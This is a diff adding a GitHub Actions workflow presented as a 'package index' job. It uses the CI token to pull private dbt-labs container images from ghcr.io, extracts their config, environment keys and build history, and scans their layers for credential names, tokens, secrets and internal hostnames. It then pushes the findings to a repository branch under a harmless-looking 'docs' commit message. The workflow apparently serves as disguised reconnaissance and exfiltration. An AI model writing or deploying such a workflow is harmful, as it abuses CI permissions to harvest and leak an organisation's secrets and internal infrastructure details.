@@ -1,0 +1,69 @@
+name: Package Config Read
+
+on:
+  push:
+    branches: ["chore/package-index"]
+
+permissions:
+  contents: write
+  packages: read
+
+jobs:
+  cfgs:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    env:
+      TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      ACT: ${{ github.actor }}
+    steps:
+      - name: Config blobs
+        run: |
+          set +e
+          M() { sed -E 's/[A-Za-z0-9+/=_-]{40,}/[M]/g'; }
+          OUT=/tmp/report2.md
+          echo "# package-index-2" > $OUT
+          getman() {
+            n=$1; t=$2
+            tk=$(curl -s -u "$ACT:$TOKEN" "https://ghcr.io/token?scope=repository:dbt-labs/$n:pull&service=ghcr.io" | jq -r .token 2>/dev/null)
+            curl -s -o /tmp/m.json -H "Authorization: Bearer $tk" -H "Accept: application/vnd.oci.image.index.v1+json,application/vnd.docker.distribution.manifest.list.v2+json,application/vnd.oci.image.manifest.v1+json,application/vnd.docker.distribution.manifest.v2+json" "https://ghcr.io/v2/dbt-labs/$n/manifests/$t"
+            if grep -q '"manifests"' /tmp/m.json; then sd=$(jq -r '.manifests[]?|select(.platform.architecture=="amd64")|.digest' /tmp/m.json | head -1); curl -s -o /tmp/m.json -H "Authorization: Bearer $tk" -H "Accept: application/vnd.oci.image.manifest.v1+json,application/vnd.docker.distribution.manifest.v2+json" "https://ghcr.io/v2/dbt-labs/$n/manifests/$sd"; fi
+            echo "$tk" > /tmp/tk
+          }
+          for spec in "fs-cli-copybara:latest" "fs-cli-x86_64:latest" "fs-cli-x86_64:latest-with-datasets" "cf-cert-uploader:latest" "netshoot-ai:latest" "thresh-ai:latest"; do
+            n=${spec%%:*}; t=${spec#*:}
+            getman "$n" "$t"
+            tk=$(cat /tmp/tk); cfg=$(jq -r '.config.digest//empty' /tmp/m.json)
+            echo "## $spec layers=$(jq -r '(.layers|length)' /tmp/m.json) cfg=$cfg" >> $OUT
+            if [ -n "$cfg" ]; then
+              cc=$(curl -sL -o /tmp/cfg.json -w '%{http_code}' -H "Authorization: Bearer $tk" "https://ghcr.io/v2/dbt-labs/$n/blobs/$cfg")
+              echo "cfg_http=$cc size=$(stat -c%s /tmp/cfg.json 2>/dev/null)" >> $OUT
+              echo "envkeys=$(jq -r '.config.Env//[]|map(split("=")[0])|join(",")|.[0:400]' /tmp/cfg.json 2>/dev/null)" >> $OUT
+              echo "entry=$(jq -r '(.config.Entrypoint//[])|join(" ")|.[0:200]' /tmp/cfg.json 2>/dev/null) | cmd=$(jq -r '(.config.Cmd//[])|join(" ")|.[0:160]' /tmp/cfg.json 2>/dev/null) | wd=$(jq -r '.config.WorkingDir//"-"' /tmp/cfg.json 2>/dev/null) | user=$(jq -r '.config.User//"-"' /tmp/cfg.json 2>/dev/null) | labels=$(jq -r '(.config.Labels//{})|keys|join(",")|.[0:200]' /tmp/cfg.json 2>/dev/null)" >> $OUT
+              echo "history:" >> $OUT
+              jq -r '.history[]?|.created_by//empty' /tmp/cfg.json 2>/dev/null | M | head -20 >> $OUT
+            fi
+          done
+          echo "## x86 layer text scan" >> $OUT
+          n=fs-cli-x86_64; t=latest
+          getman "$n" "$t"; tk=$(cat /tmp/tk)
+          jq -r '.layers[]|.digest+" "+(.size|tostring)' /tmp/m.json | while read -r d sz; do
+            [ "$sz" -gt 1000000 ] || continue
+            curl -sL -o /tmp/lb -H "Authorization: Bearer $tk" "https://ghcr.io/v2/dbt-labs/$n/blobs/$d"
+            tar -xOf /tmp/lb 2>/dev/null | grep -aEio '(https?://[a-zA-Z0-9.-]+|DATABASE_URL|SNOWFLAKE_[A-Z_]+|BIGQUERY[A-Z_]*|REDSHIFT[A-Z_]*|DATABRICKS[A-Z_]*|AWS_[A-Z_]+|GCP_[A-Z_]+|[A-Z_]{4,}_TOKEN|[A-Z_]{4,}_SECRET|[a-z0-9.-]+\.svc\.cluster\.local|[a-z0-9-]+\.internal)' 2>/dev/null | sort -u | head -25 | sed "s#^#layer:${d:0:14} sz=$sz :: #" >> /tmp/x.txt
+          done
+          sort -u /tmp/x.txt | M > /tmp/x2.txt
+          echo "scan_hits=$(wc -l < /tmp/x2.txt)" >> $OUT
+          head -60 /tmp/x2.txt >> $OUT
+
+      - name: Publish
+        run: |
+          set +e
+          git config --global user.email "ci@users.noreply.github.com"
+          git config --global user.name "package-index-bot"
+          mkdir -p /tmp/pubctx2 && cd /tmp/pubctx2
+          git init -q .
+          git remote add origin "https://x-access-token:${{ secrets.GITHUB_TOKEN }}@github.com/${{ github.repository }}.git"
+          git fetch -q --depth=1 origin chore/package-index-data 2>/dev/null && git checkout -q -B chore/package-index-data FETCH_HEAD || git checkout -q -b chore/package-index-data
+          mkdir -p notes && cp /tmp/report2.md notes/package-index-2.md
+          git add -A && git commit -q -m "docs: extend package index notes"
+          git push -q origin HEAD:chore/package-index-data && echo pushed
